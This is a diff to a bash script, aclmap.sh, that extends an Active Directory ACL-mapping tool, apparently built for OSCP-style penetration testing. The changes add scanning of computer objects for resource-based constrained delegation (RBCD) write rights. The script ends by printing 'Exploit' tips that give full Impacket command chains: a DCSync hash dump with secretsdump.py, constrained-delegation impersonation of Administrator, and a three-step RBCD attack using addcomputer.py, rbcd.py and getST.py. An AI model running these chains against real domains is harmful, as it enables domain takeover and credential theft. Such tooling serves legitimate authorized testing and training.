@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # aclmap.sh - AD ACL relationship mapper (OSCP-safe, no BloodHound required)
-# Maps dangerous ACL relationships between all AD users/groups and OUs using
-# dacledit.py (Impacket) and ldapsearch. Only requires one valid domain
+# Maps dangerous ACL relationships between all AD users/groups/computers and OUs
+# using dacledit.py (Impacket) and ldapsearch. Only requires one valid domain
 # user credential to enumerate ALL object relationships.
 #
 # Detects:
@@ -9,6 +9,9 @@
 #               GenericWrite, WriteDACL, WriteOwner, FullControl
 #               Combined/hex masks that equal GenericAll
 #               Group->User and Group->OU inherited paths
+#   RBCD:       Write rights (GenericAll/GenericWrite/WriteProperty/WriteDACL/
+#               WriteOwner) on COMPUTER objects -> can write
+#               msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD vector)
 #   DCSync:     DS-Replication-Get-Changes-All on domain root
 #   Delegation: Constrained Delegation (msDS-AllowedToDelegateTo)
 #               Unconstrained Delegation (userAccountControl flag)
@@ -119,6 +122,8 @@ classify_right() {
             echo -e "${YELLOW}WriteOwner${NC}  ${YELLOW}[MEDIUM - can take ownership, then modify ACL]${NC}" ;;
         GenericWrite)
             echo -e "${GREEN}GenericWrite${NC}  ${GREEN}[LOW-MED - can write attributes, set SPN for Kerberoasting]${NC}" ;;
+        WriteProperty)
+            echo -e "${GREEN}WriteProperty${NC}  ${GREEN}[LOW-MED - can write a specific attribute (e.g. RBCD attr on a computer)]${NC}" ;;
         *)
             echo -e "${CYAN}$right${NC}" ;;
     esac
@@ -127,8 +132,10 @@ classify_right() {
 # ── parse ACE block: extract right from mask+guid, trustee ────────────────────
 # Returns "right_name|trustee_name" or empty string if not interesting/boilerplate
 # $1 = full dacledit output for one object
+# $2 = allow_machine (1 = keep machine-account trustees, e.g. for computer targets)
 parse_aces() {
     local output="$1"
+    local allow_machine="${2:-0}"
 
     echo "$output" | awk '
     /ACE\[/ {
@@ -153,17 +160,18 @@ parse_aces() {
         echo "$trustee_name" | grep -q "$BOILERPLATE" && continue
         # Skip BUILTIN\ prefixed accounts (builtin groups)
         echo "$trustee_name" | grep -qE "^BUILTIN\\\\" && continue
-        # Skip machine accounts (ending in $) — DC/computer accounts having OU rights is normal
-        echo "$trustee_name" | grep -qE '\$' && continue
+        # Skip machine accounts (ending in $) — UNLESS scanning a computer target,
+        # where machine-account trustees can be the actual RBCD/control vector
+        if [ "$allow_machine" != "1" ]; then
+            echo "$trustee_name" | grep -qE '\$' && continue
+        fi
 
         # ── Determine right ────────────────────────────────────────────────────
         right_name=""
 
         # 1. Check known FullControl hex masks first — most reliable signal
         #    0xf01ff = FullControl (all rights)
-        #    0xe01bf = ReadAndExecute+WriteOwner+WriteDACL+AllExtendedRights+ReadProperties+ListChildObjects+DeleteChild
-        #    0xf01bd = ReadAndExecute+WriteOwner+WriteDACL+Delete+AllExtendedRights+ReadProperties+ListChildObjects
-        #    These hex values appear regardless of how the named rights are listed
+        #    0xe01bf / 0xf01bd = near-full control combinations
         if echo "$mask" | grep -qE "0xf01ff|0xe01bf|0xf01bd"; then
             right_name="FullControl"
 
@@ -183,8 +191,7 @@ parse_aces() {
         elif echo "$guid" | grep -q "User-Force-Change-Password"; then
             right_name="User-Force-Change-Password"
 
-        # 5. AllExtendedRights alone (without WriteDACL/WriteOwner — not full GenericAll
-        #    but still allows password reset + more)
+        # 5. AllExtendedRights alone
         elif echo "$mask" | grep -q "AllExtendedRights"; then
             right_name="AllExtendedRights"
 
@@ -199,6 +206,11 @@ parse_aces() {
         # 8. GenericWrite
         elif echo "$mask" | grep -q "GenericWrite"; then
             right_name="GenericWrite"
+
+        # 9. Bare WriteProperty — only surfaced on computer targets (RBCD attr write).
+        #    On users/OUs this is too noisy, so it is gated behind allow_machine.
+        elif [ "$allow_machine" = "1" ] && echo "$mask" | grep -q "WriteProperty"; then
+            right_name="WriteProperty"
         fi
 
         [ -z "$right_name" ] && continue
@@ -224,10 +236,12 @@ ldapsearch -x -H "ldap://$DCIP" -D "$USER@$DOMAIN" -w "$PASS" \
     -b "$BASE_DN" "(objectClass=user)" distinguishedName sAMAccountName 2>/dev/null \
     > "$TMPDIR/all_dns.txt"
 
-# Computers (can also have delegation/ACL rights)
+# Computers — keep a dedicated copy so we can scan them as targets later,
+# and also append to all_dns.txt so their OUs are picked up in OU parsing
 ldapsearch -x -H "ldap://$DCIP" -D "$USER@$DOMAIN" -w "$PASS" \
     -b "$BASE_DN" "(objectClass=computer)" distinguishedName sAMAccountName 2>/dev/null \
-    >> "$TMPDIR/all_dns.txt"
+    > "$TMPDIR/computers_raw.txt"
+cat "$TMPDIR/computers_raw.txt" >> "$TMPDIR/all_dns.txt"
 
 # Groups (groups can be trustees on OUs — important for group->user paths)
 ldapsearch -x -H "ldap://$DCIP" -D "$USER@$DOMAIN" -w "$PASS" \
@@ -249,23 +263,23 @@ grep "^dn:" "$TMPDIR/groups.txt" | sed -n 's/^dn: //p' | \
 
 sort -u "$TMPDIR/unique_ous.txt" -o "$TMPDIR/unique_ous.txt"
 
+# ── parse computer sAMAccountNames (targets for the new computer phase) ────────
+grep "^sAMAccountName:" "$TMPDIR/computers_raw.txt" | \
+    sed 's/^sAMAccountName:[[:space:]]*//' | sort -u > "$TMPDIR/computers.txt"
+
 OU_COUNT=$(wc -l < "$TMPDIR/unique_ous.txt")
 USER_COUNT=$(wc -l < "$USERFILE")
-TOTAL=$((USER_COUNT + OU_COUNT))
+COMPUTER_COUNT=$(wc -l < "$TMPDIR/computers.txt")
+TOTAL=$((USER_COUNT + COMPUTER_COUNT + OU_COUNT))
 
-echo -e "${GREEN}[OK]${NC} Found ${BOLD}$USER_COUNT${NC} users and ${BOLD}$OU_COUNT${NC} unique OUs"
+echo -e "${GREEN}[OK]${NC} Found ${BOLD}$USER_COUNT${NC} users, ${BOLD}$COMPUTER_COUNT${NC} computers and ${BOLD}$OU_COUNT${NC} unique OUs"
 echo -e "${CYAN}[*]${NC} Total dacledit calls: ${BOLD}$TOTAL${NC} + domain root + delegation checks"
 echo -e "${CYAN}[*]${NC} Estimated time: ~$((TOTAL * 2 / 60)) minutes"
 echo
 
 # ── step 3: build group membership map ───────────────────────────────────────
-# For each group, store which users from users.txt are members
-# This lets us resolve group->OU paths to actual user->OU paths
 echo -e "${CYAN}[*]${NC} Building group membership map..."
-declare -A GROUP_MEMBERS 2>/dev/null || true
 
-# Parse group memberships from ldapsearch output
-# Format: group DN -> list of member DNs
 current_group=""
 current_group_sam=""
 while IFS= read -r line; do
@@ -291,45 +305,40 @@ echo
 # ── step 4: check one target object ──────────────────────────────────────────
 check_target() {
     local target="$1"
-    local target_type="$2"  # "user" or "ou"
+    local target_type="$2"  # "user", "computer", or "ou"
     local target_flag=""
+    local allow_machine=0
+    local label="USER"
 
-    [ "$target_type" = "ou" ] && target_flag="-target-dn" || target_flag="-target"
+    case "$target_type" in
+        ou)       target_flag="-target-dn"; label="OU" ;;
+        computer) target_flag="-target";    label="COMPUTER"; allow_machine=1 ;;
+        *)        target_flag="-target";    label="USER" ;;
+    esac
 
     local output
     output=$(dacledit.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" \
         $target_flag "$target" -action read 2>/dev/null)
 
-    parse_aces "$output" | while IFS='|' read -r right trustee; do
-        # Check if trustee is a group that contains our users
-        # If so, expand to user->target relationships
+    parse_aces "$output" "$allow_machine" | while IFS='|' read -r right trustee; do
+        # Check if trustee is a group that contains our users -> expand to user paths
         is_group=0
         if grep -q "^$trustee|" "$TMPDIR/group_members.txt" 2>/dev/null; then
             is_group=1
         fi
 
         if [ "$is_group" -eq 1 ]; then
-            # Expand group to individual users
             grep "^$trustee|" "$TMPDIR/group_members.txt" | cut -d'|' -f2 | while read -r group_user; do
-                if [ "$target_type" = "ou" ]; then
-                    echo "OU|$group_user|$target|$right|via group: $trustee"
-                else
-                    echo "USER|$group_user|$target|$right|via group: $trustee"
-                fi
+                echo "$label|$group_user|$target|$right|via group: $trustee"
             done >> "$RESULTS_FILE"
         else
-            # Direct trustee relationship
-            if [ "$target_type" = "ou" ]; then
-                echo "OU|$trustee|$target|$right|direct"
-            else
-                echo "USER|$trustee|$target|$right|direct"
-            fi
+            echo "$label|$trustee|$target|$right|direct"
         fi
     done >> "$RESULTS_FILE"
 }
 
 # ── step 5: scan all users ────────────────────────────────────────────────────
-echo -e "${BOLD}[Phase 1/3]${NC} Scanning user objects for ACL relationships..."
+echo -e "${BOLD}[Phase 1/4]${NC} Scanning user objects for ACL relationships..."
 tput sc
 COUNT=0
 while IFS= read -r target_user; do
@@ -343,8 +352,28 @@ tput rc; tput el
 echo -e "${GREEN}[OK]${NC} User scan complete"
 echo
 
-# ── step 6: scan all OUs ─────────────────────────────────────────────────────
-echo -e "${BOLD}[Phase 2/3]${NC} Scanning OU objects for ACL relationships..."
+# ── step 6: scan all computers ───────────────────────────────────────────────
+echo -e "${BOLD}[Phase 2/4]${NC} Scanning computer objects for ACL relationships (RBCD)..."
+if [ "$COMPUTER_COUNT" -eq 0 ]; then
+    echo -e "${YELLOW}[!]${NC} No computer objects found — skipping."
+    echo
+else
+    tput sc
+    COUNT=0
+    while IFS= read -r target_comp; do
+        [ -z "$target_comp" ] && continue
+        ((++COUNT)) || true
+        tput rc; tput el
+        printf "${CYAN}[*]${NC} [$COUNT/$COMPUTER_COUNT] Checking computer: $target_comp"
+        check_target "$target_comp" "computer" >/dev/null 2>/dev/null
+    done < "$TMPDIR/computers.txt"
+    tput rc; tput el
+    echo -e "${GREEN}[OK]${NC} Computer scan complete"
+    echo
+fi
+
+# ── step 7: scan all OUs ─────────────────────────────────────────────────────
+echo -e "${BOLD}[Phase 3/4]${NC} Scanning OU objects for ACL relationships..."
 tput sc
 COUNT=0
 while IFS= read -r target_ou; do
@@ -358,14 +387,13 @@ tput rc; tput el
 echo -e "${GREEN}[OK]${NC} OU scan complete"
 echo
 
-# ── step 7: DCSync rights check ───────────────────────────────────────────────
-echo -e "${BOLD}[Phase 3/3]${NC} Checking DCSync rights and delegation..."
+# ── step 8: DCSync rights check + delegation ──────────────────────────────────
+echo -e "${BOLD}[Phase 4/4]${NC} Checking DCSync rights and delegation..."
 
 DCSYNC_OUTPUT=$(dacledit.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" \
     -target-dn "$BASE_DN" -action read 2>/dev/null)
 
 # DCSync requires DS-Replication-Get-Changes-All (GUID: 1131f6ad)
-# Also catch AllExtendedRights and FullControl which include replication rights
 echo "$DCSYNC_OUTPUT" | awk '
 /ACE\[/ { mask = ""; guid = ""; trustee = "" }
 /Access mask[[:space:]]*:/ { mask = $0 }
@@ -382,7 +410,6 @@ echo "$DCSYNC_OUTPUT" | awk '
     echo "$trustee_name" | grep -qE "^BUILTIN\\\\" && continue
     echo "$trustee_name" | grep -qE '\$' && continue
 
-    # DCSync-specific GUID OR AllExtendedRights OR FullControl hex masks
     if echo "$guid" | grep -q "1131f6ad\|1131f6aa\|DS-Replication"; then
         echo "$trustee_name|DCSync-specific" >> "$DCSYNC_FILE"
     elif echo "$mask" | grep -qE "AllExtendedRights|0xf01ff|0xe01bf|0xf01bd"; then
@@ -390,7 +417,6 @@ echo "$DCSYNC_OUTPUT" | awk '
     fi
 done
 
-# ── step 8: delegation checks ─────────────────────────────────────────────────
 # Constrained delegation
 ldapsearch -x -H "ldap://$DCIP" -D "$USER@$DOMAIN" -w "$PASS" \
     -b "$BASE_DN" "(msDS-AllowedToDelegateTo=*)" \
@@ -416,18 +442,16 @@ echo -e "${BOLD}${CYAN}           ACL RELATIONSHIP MAP - RESULTS               $
 echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════${NC}"
 echo
 
-# ── Build deduplicated unified ACL result set ─────────────────────────────────
-# Track seen trustee→target pairs to avoid duplicates across direct+OU results
 SEEN_FILE="$TMPDIR/seen_pairs.txt"
 touch "$SEEN_FILE"
 
-# ── ACL: direct user→user relationships ──────────────────────────────────────
 USER_RESULTS=$(grep "^USER|" "$RESULTS_FILE" | sort -u)
+COMPUTER_RESULTS=$(grep "^COMPUTER|" "$RESULTS_FILE" | sort -u)
 OU_RESULTS=$(grep "^OU|" "$RESULTS_FILE" | sort -u)
 
+# ── ACL: direct user→user relationships ──────────────────────────────────────
 HAS_DIRECT_RESULTS=0
 if [ -n "$USER_RESULTS" ]; then
-    # Check if any non-duplicate results exist
     while IFS='|' read -r type trustee target right via; do
         pair="$trustee|$target"
         if ! grep -qF "$pair" "$SEEN_FILE" 2>/dev/null; then
@@ -454,11 +478,30 @@ if [ "$HAS_DIRECT_RESULTS" -eq 1 ]; then
     done
 fi
 
+# ── ACL: computer object relationships (RBCD vectors) ─────────────────────────
+if [ -n "$COMPUTER_RESULTS" ]; then
+    echo -e "${BOLD}── Computer object ACL relationships (RBCD vectors) ────${NC}"
+    echo
+    echo "$COMPUTER_RESULTS" | while IFS='|' read -r type trustee target right via; do
+        if [ "$via" = "direct" ]; then
+            echo -e "  ${BOLD}$trustee${NC}  ${CYAN}→${NC}  ${BOLD}$target${NC}"
+        else
+            echo -e "  ${BOLD}$trustee${NC}  ${CYAN}→${NC}  ${BOLD}$target${NC}  ${MAGENTA}($via)${NC}"
+        fi
+        echo -e "  └─ $(classify_right "$right")"
+        # Any write-capable right on a computer = can write the RBCD attribute
+        case "$right" in
+            GenericAll|FullControl|COMBINED_GENERICALL|GenericWrite|WriteProperty|WriteDACL|WriteOwner)
+                echo -e "     ${RED}↳ RBCD vector${NC}: can write ${BOLD}msDS-AllowedToActOnBehalfOfOtherIdentity${NC} on $target"
+                ;;
+        esac
+        echo
+    done
+fi
+
 # ── ACL: ou→user (expanded, deduplicated against direct results) ──────────────
 HAS_OU_RESULTS=0
-
 if [ -n "$OU_RESULTS" ]; then
-    # Pre-check if any non-duplicate OU results exist after expansion
     while IFS='|' read -r type trustee target_ou right via; do
         while IFS= read -r u; do
             [ -z "$u" ] && continue
@@ -481,7 +524,6 @@ fi
 if [ "$HAS_OU_RESULTS" -eq 1 ]; then
     echo -e "${BOLD}── OU-inherited ACL relationships ──────────────────────${NC}"
     echo
-
     echo "$OU_RESULTS" | while IFS='|' read -r type trustee target_ou right via; do
         while IFS= read -r u; do
             [ -z "$u" ] && continue
@@ -561,4 +603,8 @@ echo -e "${YELLOW}[TIP]${NC}  Exploit DCSync:"
 echo -e "       secretsdump.py ${DOMAIN}/<account>:<pass>@$DCIP"
 echo -e "${YELLOW}[TIP]${NC}  Exploit Constrained Delegation:"
 echo -e "       getST.py -spn <service> -impersonate Administrator ${DOMAIN}/<account>:<pass> -dc-ip $DCIP"
+echo -e "${YELLOW}[TIP]${NC}  Exploit RBCD (write rights on a computer object):"
+echo -e "       1. Add machine acct (needs MAQ>0):  addcomputer.py -computer-name '<NEW\$>' -computer-pass '<pass>' ${DOMAIN}/<user>:<pass> -dc-ip $DCIP"
+echo -e "       2. Configure delegation:            rbcd.py -delegate-from '<NEW\$>' -delegate-to '<TARGET\$>' -action write ${DOMAIN}/<user>:<pass> -dc-ip $DCIP"
+echo -e "       3. Request ticket:                  getST.py -spn <service>/<target.fqdn> -impersonate Administrator ${DOMAIN}/'<NEW\$>':'<pass>' -dc-ip $DCIP"
 echo
